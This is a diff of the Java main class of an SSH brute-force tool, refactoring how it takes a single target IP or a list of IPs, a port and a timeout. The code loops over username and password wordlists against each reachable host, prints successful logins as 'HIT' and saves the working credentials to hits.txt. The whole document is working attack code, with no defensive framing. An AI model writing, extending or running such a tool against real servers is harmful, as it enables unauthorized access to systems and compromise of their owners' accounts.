@@ -15,9 +15,13 @@ public class Main {
 
     // init objects
     public static Scanner scanner = new Scanner(System.in);
+    public static Logger logger = Logger.INSTANCE;
 
     // init basic variables
-    public static int portToScan = 22;
+    public static boolean useIPList = false;
+    public static String targetIP = null;
+    public static int targetPort = 22;
+    public static int maxTimeOutSeconds = 5;
 
     // MAIN APP FUCTION
     public static void main(String[] args) {
@@ -32,148 +36,159 @@ public class Main {
             ResourcesUtils.copyResource(Main.class.getClassLoader().getResourceAsStream("passwords.txt"), "passwords.txt");
         }
 
-        // question on port
-        System.out.print(ConsoleColors.CODES.ANSI_CYAN + "Type port do you want to scan: ");
-        String port = scanner.nextLine();
+        // question use ip-list.txt
+        logger.logInLine("Do you want to use ip-list.txt [Y/N]: ");
 
-        // check if port empty
-        if (port.isEmpty()) {
-            Logger.INSTANCE.logError("error please type valid port number");
-            SystemUtils.appShutdown(0);
+        // check if use ip-list
+        if (!scanner.nextLine().equalsIgnoreCase("n")) {
+            useIPList = true;
+
+            // create default ip-list.txt
+            if (!FileUtils.ifFileExist("ip-list.txt")) {
+                ResourcesUtils.copyResource(Main.class.getClassLoader().getResourceAsStream("ip-list.txt"), "ip-list.txt");
+            }
+
         } else {
 
-            // check if port is number
-            if (StringUtils.isNumeric(port)) {
+            // question target ip
+            logger.logInLine("Enter target ip: ");
 
-                // convert port to int value
-                portToScan = Integer.parseInt(port);
-            } else {
+            // get ip form scanner and save to var
+            targetIP = scanner.nextLine();
 
-                // exit if port is not number
-                Logger.INSTANCE.logError("error port number must be a number");
+            // check if target ip is valid
+            if (!NetworkUtils.checkIPv4(targetIP)) {
+                logger.logError("Error: your target ip is not valid ip format");
                 SystemUtils.appShutdown(0);
             }
         }
 
-        // question on iplist
-        System.out.print(ConsoleColors.CODES.ANSI_CYAN + "Do you want to use the ip list? [Y/N]: ");
-        String ipList = scanner.nextLine();
+        // question to target port
+        logger.logInLine("Enter target port [default is 22]: ");
 
-        // check if iplist used
-        if (!ipList.equalsIgnoreCase("n")) {
+        // temp port var
+        String enterPort = scanner.nextLine();
 
-            // check if iplist found
+        // check if port entered
+        if (!enterPort.isEmpty()) {
+
+            // check if enter port is numeric format
+            if (StringUtils.isNumeric(enterPort)) {
+
+                // save new target port
+                targetPort = Integer.parseInt(enterPort);
+            }
+        }
+
+        // question for max timeout seconds
+        logger.logInLine("Enter max connection timeout [default is 5s]: ");
+
+        // temp timeout seconds
+        String timeOutTemp = scanner.nextLine();
+
+        // check if not default
+        if (!timeOutTemp.isEmpty()) {
+            // check if seconds is numeric
+            if (StringUtils.isNumeric(timeOutTemp)) {
+
+                // save new timeout seconds
+                maxTimeOutSeconds = Integer.parseInt(timeOutTemp);
+            }
+        }
+
+        // check if used ip-list
+        if (useIPList) {
+
+            // check if ip-list found
             if (!FileUtils.ifFileExist("ip-list.txt")) {
-                Logger.INSTANCE.logError("error: ip list not found, please create ip-list.txt with ips to scan");
+                Logger.INSTANCE.logError("Error: ip-list.txt not found");
+                SystemUtils.appShutdown(0);
             } else {
 
-                // check if ip list exist
-                if (FileUtils.ifFileExist("ip-list.txt")) {
+                try (BufferedReader br = new BufferedReader(new FileReader("ip-list.txt"))) {
+                    String ipToAttack;
 
-                    try (BufferedReader br = new BufferedReader(new FileReader("ip-list.txt"))) {
-                        String ipToScan;
+                    // for all ips in iplist.txt
+                    while ((ipToAttack = br.readLine()) != null) {
 
-                        // for all ips in iplist.txt
-                        while ((ipToScan = br.readLine()) != null) {
-                            connectSSH(ipToScan, portToScan);
+                        // check if ipv4 reachable ssh
+                        if (!NetworkUtils.isReachable(ipToAttack, targetPort, maxTimeOutSeconds * 1000)) {
+                            logger.logError("'"+ ipToAttack + ":" + targetPort + "'" + " -> SSH unreachable");
+                        } else {
+                            connectSSH(ipToAttack, targetPort);
                         }
-                    } catch (IOException e) {
-                        Logger.INSTANCE.logError(e.getMessage());
                     }
+                    SystemUtils.appShutdown(0);
+                } catch (IOException e) {
+                    Logger.INSTANCE.logError(e.getMessage());
                 }
             }
-
         } else {
 
-            // question on iplist
-            System.out.print(ConsoleColors.CODES.ANSI_CYAN + "Please enter IPv4 address: ");
-            String ipAdress = scanner.nextLine();
-
-            // check if ip configured
-            if (ipAdress.isEmpty()) {
-
-                // argument empty error
-                Logger.INSTANCE.logError("error: input ip is empty");
+            // check if ipv4 reachable ssh
+            if (!NetworkUtils.isReachable(targetIP, targetPort, maxTimeOutSeconds * 1000)) {
+                logger.logError("'"+ targetIP + ":" + targetPort + "'" + " -> SSH unreachable");
             } else {
-
-                // check if ip is valid
-                if (!NetworkUtils.checkIPv4(ipAdress)) {
-                    Logger.INSTANCE.logError("'"+ ipAdress + "'" + " is not valid IPv4");
-
-                } else {
-
-                    // main connect function call
-                    connectSSH(ipAdress, portToScan);
-                }
+                connectSSH(targetIP, targetPort);
+                SystemUtils.appShutdown(0);
             }
         }
-
-        // check if hits found
-        if (FileUtils.ifFileExist("hits.txt")) {
-            Logger.INSTANCE.log("brutefoce is finished, possible hits can be found in the hists.txt file");
-        } else {
-            Logger.INSTANCE.log("brutefoce is finished");
-        }
-
-        // exit app
-        SystemUtils.appShutdown(0);
     }
 
     // main SSH connect function
     public static void connectSSH(String host, int port) {
 
-        // check if ipv4 reachable ssh
-        if (!NetworkUtils.isReachable(host, port, 10000)) {
-            Logger.INSTANCE.logError("'"+ host + "'" + " SSH is not reachable");
-        } else {
+        // check if usernames list exist
+        if (FileUtils.ifFileExist("usernames.txt")) {
 
-            // check if usernames list exist
-            if (FileUtils.ifFileExist("usernames.txt")) {
+            try (BufferedReader br = new BufferedReader(new FileReader("usernames.txt"))) {
+                String user;
 
-                try (BufferedReader br = new BufferedReader(new FileReader("usernames.txt"))) {
-                    String user;
+                // for all users in usernames.txt
+                while ((user = br.readLine()) != null) {
 
-                    // for all users in usernames.txt
-                    while ((user = br.readLine()) != null) {
+                    // check if password list exist
+                    if (FileUtils.ifFileExist("passwords.txt")) {
 
-                        // check if password list exist
-                        if (FileUtils.ifFileExist("passwords.txt")) {
+                        try (BufferedReader br1 = new BufferedReader(new FileReader("passwords.txt"))) {
+                            String password;
 
-                            try (BufferedReader br1 = new BufferedReader(new FileReader("passwords.txt"))) {
-                                String password;
+                            // for all passwwords in passwords.txt
+                            while ((password = br1.readLine()) != null) {
 
-                                // for all passwwords in passwords.txt
-                                while ((password = br1.readLine()) != null) {
+                                // main connect function call
+                                if (NetworkUtils.sshConnectionValid(user, port, host, password)) {
+                                    // print connection hit sucess
+                                    logger.log(ConsoleColors.CODES.ANSI_GREEN + "HIT: " + host + ":" + port + " with " + user + ":" + password + " connection sucess");
 
-                                    // main connect function call
-                                    if (NetworkUtils.sshConnectionValid(user, port, host, password)) {
-                                        // print connection hit sucess
-                                        Logger.INSTANCE.log(ConsoleColors.CODES.ANSI_GREEN + "HIT: " + host + ":" + port + " with " + user + ":" + password + " connection sucess");
+                                    FileUtils.saveMessageLog("host: " + host + ":" + port + " connect with: " + user + ":" + password, "hits.txt");
+                                } else {
 
-                                        FileUtils.saveMessageLog("host: " + host + ":" + port + " connect with credentials: " + user + ":" + password, "hits.txt");
-                                    } else {
-
-                                        // print connection error
-                                        Logger.INSTANCE.log(ConsoleColors.CODES.ANSI_YELLOW + host + ":" + port + " -> " + user + ":" + password + " not connected");
-                                    }
+                                    // print connection error
+                                    logger.log(ConsoleColors.CODES.ANSI_YELLOW + host + ":" + port + " -> " + user + ":" + password + " not connected");
                                 }
-                            } catch (IOException e) {
-                                Logger.INSTANCE.logError(e.getMessage());
+
+                                // print spacer
+                                logger.printSpacer();
                             }
-
-                        } else {
-                            // log file not exist error
-                            Logger.INSTANCE.logError("error passwords.txt not found, please check your file or try reinstall this app");
+                        } catch (IOException e) {
+                            logger.logError(e.getMessage());
                         }
-                    }
-                } catch (IOException e) {
-                    Logger.INSTANCE.logError(e.getMessage());
-                }
 
-            } else {
-                // log file not exist error
-                Logger.INSTANCE.logError("error usernames.txt not found, please check your file or try reinstall this app");
+                    } else {
+                        // log file not exist error
+                        logger.logError("Error passwords.txt not found");
+                        SystemUtils.appShutdown(0);
+                    }
+                }
+            } catch (IOException e) {
+                logger.logError(e.getMessage());
             }
+
+        } else {
+            // log file not exist error
+            logger.logError("Error usernames.txt not found");
+            SystemUtils.appShutdown(0);
         }
     }
 }
